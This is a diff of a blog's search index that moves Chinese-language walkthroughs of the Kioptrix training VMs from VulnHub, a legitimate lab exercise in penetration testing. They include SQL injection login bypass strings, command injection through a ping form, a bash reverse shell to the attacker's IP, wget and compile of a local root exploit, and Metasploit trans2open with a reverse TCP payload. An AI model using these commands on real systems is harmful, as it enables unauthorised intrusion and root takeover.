@@ -253,70 +253,6 @@
       </tags>
   </entry>
   <entry>
-    <title>KIOPTRIX: LEVEL 1.1</title>
-    <url>/2024/11/30/KIOPTRIX-LEVEL-1-1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
-<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
-<br>
-<br>
-
-<h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h2><ul>
-<li>匯入 VMware</li>
-<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
-<li><a class="link" href="https://youtu.be/vWQWikIR4Xw?si=F1F5dTH6T0kh-1ix">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkmCJdoFT.png" alt="image"></li>
-</ul>
-<br>
-<br>
-
-<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用<code>ifconfig</code>查看自己的IP。<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1C5JOsK6.png" alt="image"></p>
-<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.0.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkAGeuoYa.png" alt="image"></p>
-<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.0.9</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyhIe_jF6.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟二、尋找進入點"><a href="#步驟二、尋找進入點" class="headerlink" title="步驟二、尋找進入點"></a>步驟二、尋找進入點</h2><p>因為有http與https服務，所以網址列<code>http://192.168.0.9/</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyVGfOiKa.png" alt="image"></p>
-<p>檢視頁面來源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B14jGuoKa.png" alt="image"></p>
-<p>嘗試使用 <a class="link" href="https://stackoverflow.com/questions/53688134/what-is-the-meaning-of-admin-or-1-1">SQL Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，在Username輸入：<br><code> ' or 1=1#</code> 或<code>admin' or '1'='1'/*</code>或<code>admin' #</code>或<code>admin' or 1=1-- </code>。<br><code>admin' --</code>與<code>admin' or 1=1--</code>實作無效，因為<code>--</code>後面需要空格。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyNWCciFT.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟三、RCE-Remote-Code-Execution"><a href="#步驟三、RCE-Remote-Code-Execution" class="headerlink" title="步驟三、RCE(Remote Code Execution)"></a>步驟三、RCE(Remote Code Execution)</h2><p>進入後會得到一個ping頁面。<br>127.0.0.1（本地主機）。<br>透過RCE尋找有用資訊並控制。</p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByVmXjiYp.png" alt="image"></p>
-<p><code>ping 127.0.0.1;pwd</code>或<code>ping 127.0.0.1|pwd</code>。</p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJAFmsjFT.png" alt="image"></p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkyYXosFp.png" alt="image"></p>
-<p><code>ping 127.0.0.1|ls</code>。</p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvpXsjF6.png" alt="image"><br><br></p>
-<p>參考 <a class="link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br>與自己建立了一個 TCP 反向 shell 連接，將目標系統的<br>標準輸入、輸出和錯誤都與攻擊者的遠端位置相連接。</p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByeYzhjtT.png" alt="image"></p>
-<p>先打好<code>nc -nvlp 8888</code>送出再網頁輸入。<br><code>ping 127.0.0.1|bash -i &gt;&amp; /dev/tcp/192.168.0.8/8888 0&gt;&amp;1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HycNH2jKa.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkRfH3iKa.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvJunsYa.png" alt="image"><br>LSB 的全稱是 “Linux Standard Base”（Linux 標準基準）。LSB 是一個開放標準，定義了 Linux 操作系統的核心元件和應用程式的標準接口，以確保不同 Linux 發行版之間的二進制兼容性。<br><br><br><br></p>
-<h2 id="步驟四、搜索漏洞"><a href="#步驟四、搜索漏洞" class="headerlink" title="步驟四、搜索漏洞"></a>步驟四、搜索漏洞</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit 2.6.9</span><br><span class="line">searchsploit CentOS 4.5</span><br></pre></td></tr></table></figure></div>
-<p>searchsploit 是 Exploit Database 中的一個工具，用於搜索漏洞利用程式（exploits）和Shellcode的資料庫。Exploit Database 是一個包含各種漏洞利用程式、Shellcode和相關資訊的公共資料庫，旨在協助渗透測試和安全研究。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rk2oYnjKp.png" alt="image"><br><br><br><br></p>
-<p><code>searchsploit -m linux_x86/local/9542.c</code></p>
-<p>searchsploit -m linux/local/9542.c 是一個使用 searchsploit 工具的命令。在這個命令中，-m 表示 “mirror”（鏡像），它的作用是將 Exploit Database 中路徑為 linux/local/9542.c 的漏洞利用程式文件複製到當前工作目錄。-m 選項使您能夠在不離開命令行的情況下複製漏洞利用程式文件。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1uqIpoYa.png" alt="image"></p>
-<br>
-<br>
-
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.8/9542.c</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJbFVToFp.png" alt="image"></p>
-<p>因為沒有起相關http服務被拒絕，因此<code>pytho3 -m http.server 80</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJmbp2itT.png" alt="image"></p>
-<p>再一次<code>wget http://192.168.0.8/9542.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJA3Vaitp.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc -o exploit 9542.c</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkcfUpsFT.png" alt="image"></p>
-<p>如果想解warning，<code>echo &gt;&gt; 9542.c</code>這個命令利用了 echo 命令用於輸出文本，以及 &gt;&gt; 重定向操作符用於將輸出附加到文件末尾。當這個命令運行時，它將一個空字符串（即一個換行符號）添加到指定文件的末尾。這是一種快速且常見的方式，特別是當需要手動在文件末尾插入換行符號時。然而，這種方法僅限於向文件末尾添加換行符號，並假設文件 9542.c 已經存在。如果文件不存在，則這個命令將創建一個新文件。<br><br><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryekITjKT.png" alt="image"></p>
-]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackTheBox</title>
-    <url>/2024/12/09/HackTheBox/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>KIOPTRIX: LEVEL 1.2</title>
     <url>/2024/11/30/KIOPTRIX-LEVEL-1-2/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -370,52 +306,64 @@
       </tags>
   </entry>
   <entry>
-    <title>KIOPTRIX: LEVEL 1</title>
-    <url>/2024/11/30/KIOPTRIX-LEVEL-1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Description</strong><br>KIOPTRIX VM IMAGE CHALLENGES:<br>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+    <title>HackTheBox</title>
+    <url>/2024/12/09/HackTheBox/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KIOPTRIX: LEVEL 1.1</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
 <p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
 <br>
 <br>
 
 <h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h2><ul>
-<li>匯入 VMware<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1IEeaOKp.png" alt="image"></li>
+<li>匯入 VMware</li>
 <li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
-<li><a class="link" href="https://youtu.be/9cKhZaYecM4?si=v4t-Rware1D48a8Z">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByNlUGtFp.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/vWQWikIR4Xw?si=F1F5dTH6T0kh-1ix">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkmCJdoFT.png" alt="image"></li>
 </ul>
 <br>
 <br>
 
-
-<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用ifconfig查看自己的IP。<code>192.168.1.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJshOmKYT.png" alt="image"></p>
-<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.1.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJTDdXKFp.png" alt="image"></p>
-<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.1.104</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkJSYmKKT.png" alt="image"></p>
+<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用<code>ifconfig</code>查看自己的IP。<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1C5JOsK6.png" alt="image"></p>
+<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.0.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkAGeuoYa.png" alt="image"></p>
+<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.0.9</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyhIe_jF6.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟二、尋找進入點"><a href="#步驟二、尋找進入點" class="headerlink" title="步驟二、尋找進入點"></a>步驟二、尋找進入點</h2><p>因為有http與https服務，所以網址列<code>http://192.168.0.9/</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyVGfOiKa.png" alt="image"></p>
+<p>檢視頁面來源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B14jGuoKa.png" alt="image"></p>
+<p>嘗試使用 <a class="link" href="https://stackoverflow.com/questions/53688134/what-is-the-meaning-of-admin-or-1-1">SQL Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，在Username輸入：<br><code> ' or 1=1#</code> 或<code>admin' or '1'='1'/*</code>或<code>admin' #</code>或<code>admin' or 1=1-- </code>。<br><code>admin' --</code>與<code>admin' or 1=1--</code>實作無效，因為<code>--</code>後面需要空格。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyNWCciFT.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟三、RCE-Remote-Code-Execution"><a href="#步驟三、RCE-Remote-Code-Execution" class="headerlink" title="步驟三、RCE(Remote Code Execution)"></a>步驟三、RCE(Remote Code Execution)</h2><p>進入後會得到一個ping頁面。<br>127.0.0.1（本地主機）。<br>透過RCE尋找有用資訊並控制。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByVmXjiYp.png" alt="image"></p>
+<p><code>ping 127.0.0.1;pwd</code>或<code>ping 127.0.0.1|pwd</code>。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJAFmsjFT.png" alt="image"></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkyYXosFp.png" alt="image"></p>
+<p><code>ping 127.0.0.1|ls</code>。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvpXsjF6.png" alt="image"><br><br></p>
+<p>參考 <a class="link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br>與自己建立了一個 TCP 反向 shell 連接，將目標系統的<br>標準輸入、輸出和錯誤都與攻擊者的遠端位置相連接。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByeYzhjtT.png" alt="image"></p>
+<p>先打好<code>nc -nvlp 8888</code>送出再網頁輸入。<br><code>ping 127.0.0.1|bash -i &gt;&amp; /dev/tcp/192.168.0.8/8888 0&gt;&amp;1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HycNH2jKa.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkRfH3iKa.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvJunsYa.png" alt="image"><br>LSB 的全稱是 “Linux Standard Base”（Linux 標準基準）。LSB 是一個開放標準，定義了 Linux 操作系統的核心元件和應用程式的標準接口，以確保不同 Linux 發行版之間的二進制兼容性。<br><br><br><br></p>
+<h2 id="步驟四、搜索漏洞"><a href="#步驟四、搜索漏洞" class="headerlink" title="步驟四、搜索漏洞"></a>步驟四、搜索漏洞</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit 2.6.9</span><br><span class="line">searchsploit CentOS 4.5</span><br></pre></td></tr></table></figure></div>
+<p>searchsploit 是 Exploit Database 中的一個工具，用於搜索漏洞利用程式（exploits）和Shellcode的資料庫。Exploit Database 是一個包含各種漏洞利用程式、Shellcode和相關資訊的公共資料庫，旨在協助渗透測試和安全研究。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rk2oYnjKp.png" alt="image"><br><br><br><br></p>
+<p><code>searchsploit -m linux_x86/local/9542.c</code></p>
+<p>searchsploit -m linux/local/9542.c 是一個使用 searchsploit 工具的命令。在這個命令中，-m 表示 “mirror”（鏡像），它的作用是將 Exploit Database 中路徑為 linux/local/9542.c 的漏洞利用程式文件複製到當前工作目錄。-m 選項使您能夠在不離開命令行的情況下複製漏洞利用程式文件。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1uqIpoYa.png" alt="image"></p>
 <br>
-    
-<h2 id="步驟二、尋找漏洞"><a href="#步驟二、尋找漏洞" class="headerlink" title="步驟二、尋找漏洞"></a>步驟二、尋找漏洞</h2><p>Metasploit 框架是一個功能豐富的開源渗透測試框架，其中的 msfconsole 是其<br>主要命令行界面，提供了一個互動式的控制台，用於進行漏洞測試和攻擊模擬。</p>
-<ol>
-<li>探索漏洞：<br>使用 <code>search</code> 指令來搜尋 Metasploit 框架中的漏洞模組。例如，你可以輸入以下指令搜尋特定漏洞： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search &lt;漏洞名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>選擇攻擊模組：<br>使用 use 指令來選擇要使用的攻擊模組。一旦你找到了想要利用的漏洞模組，可以使用以下指令： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use &lt;模組名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>設定攻擊模組參數：<br>使用 set 指令來設定攻擊模組的相關參數，以便定制攻擊的目標和方式。例如： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set &lt;參數名稱&gt; &lt;值&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>執行攻擊：<br>最後，使用 exploit 指令來執行選擇的攻擊模組，觸發相應的攻擊。這將開始模擬或實際執行渗透測試。 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-<br>
 <br>
 
-<p><code>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</code> 很可疑。<br>smbd 是 Samba 軟體套件中的一個核心組件，是 Samba Daemon 的縮寫。Samba 是一個開源的軟體套件，提供了與 Microsoft Windows 互通的 SMB/CIFS 協定的實現。Samba 允許非 Windows 系統（例如 Linux、Unix）與 Windows 系統共享檔案、印表機和其他資源。smbd 是 Samba 中負責實現 SMB（Server Message Block）協定的守護進程，它允許其他機器通過 SMB/CIFS 協定訪問和共享資源。這使得 Linux/Unix 系統能夠擔任文件伺服器，與 Windows 系統協同工作，共享檔案和資源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1ack4FY6.png" alt="image"><br><br><br>使用 msfconsole 查看。<code>sudo msfconsole</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByKQyEKFp.png" alt="image"><br><br><br>查看<code>search smb_version</code>。使用<code>use 0</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ7BgNYFT.png" alt="image"><br><br><br><code> options</code>。<br>在 Metasploit 框架中，options 是一個用於查看和配置模組（payload、exploit、auxiliary 等）參數的指令。這個指令允許你檢視目前模組的參數配置狀態，以及進行必要的修改。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJHFbEFta.png" alt="image"><br><br><br>設置<code>RHOSTS</code>參數為<code>192.169.1.104</code>。<br><code>set RHOSTS 192.168.1.104</code>。再<code>show options</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkDkfVttT.png" alt="image"><br><br><br><code>exploit</code>。得到smba版本<code>Samba 2.2.1a</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryKvG4KYp.png" alt="image"><br><br></p>
-<h2 id="步驟三、查找漏洞版本問題"><a href="#步驟三、查找漏洞版本問題" class="headerlink" title="步驟三、查找漏洞版本問題"></a>步驟三、查找漏洞版本問題</h2><p>Google <code>Samba 2.2.1a</code>在msfconsole上<a class="link" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open">應用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rySDQEYFp.png" alt="image"></p>
-<p>找到使用<code>trans2open</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByXQSwtt6.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search trans2open</span><br><span class="line">use 1</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1k4IvKFa.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.104</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1La8wKYT.png" alt="image"></p>
-<p><code>exploit</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkgfwDtYa.png" alt="image"><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyThuwKFa.png" alt="image"><br>對於 generic/shell_reverse_tcp 這樣的 payload，它是一個反向 shell 載荷，通常設計成能夠與目標系統建立反向的 TCP 連接，以提供互動式的 shell 會話。generic 的使用表示這個 payload 將根據攻擊環境的具體情況進行一些通用的調整，以確保它在不同情境下的兼容性。<br><br></p>
-<h2 id="步驟四、驗證身分"><a href="#步驟四、驗證身分" class="headerlink" title="步驟四、驗證身分"></a>步驟四、驗證身分</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyFKOPtKp.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.8/9542.c</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJbFVToFp.png" alt="image"></p>
+<p>因為沒有起相關http服務被拒絕，因此<code>pytho3 -m http.server 80</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJmbp2itT.png" alt="image"></p>
+<p>再一次<code>wget http://192.168.0.8/9542.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJA3Vaitp.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc -o exploit 9542.c</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkcfUpsFT.png" alt="image"></p>
+<p>如果想解warning，<code>echo &gt;&gt; 9542.c</code>這個命令利用了 echo 命令用於輸出文本，以及 &gt;&gt; 重定向操作符用於將輸出附加到文件末尾。當這個命令運行時，它將一個空字符串（即一個換行符號）添加到指定文件的末尾。這是一種快速且常見的方式，特別是當需要手動在文件末尾插入換行符號時。然而，這種方法僅限於向文件末尾添加換行符號，並假設文件 9542.c 已經存在。如果文件不存在，則這個命令將創建一個新文件。<br><br><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryekITjKT.png" alt="image"></p>
 ]]></content>
       <tags>
         <tag>VulnHub</tag>
@@ -508,6 +456,58 @@
       </tags>
   </entry>
   <entry>
+    <title>KIOPTRIX: LEVEL 1</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Description</strong><br>KIOPTRIX VM IMAGE CHALLENGES:<br>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h2><ul>
+<li>匯入 VMware<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1IEeaOKp.png" alt="image"></li>
